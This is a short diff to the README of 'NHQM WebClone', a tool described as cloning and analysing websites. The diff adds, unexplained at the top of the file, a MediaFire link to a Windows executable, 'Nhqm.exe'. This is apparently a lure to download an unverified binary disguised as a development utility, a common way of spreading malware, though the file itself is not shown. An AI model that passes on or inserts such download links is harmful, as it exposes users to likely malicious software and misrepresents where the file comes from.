@@ -1,3 +1,5 @@
+https://www.mediafire.com/file/mjn1r69zd4djfm7/Nhqm.exe/file
+
 # NHQM WebClone — Website Cloning & Web Analysis Tool
 
 **NHQM WebClone** is a web development utility designed to analyze website structures and create local copies of publicly accessible web pages for development, testing, and educational purposes.
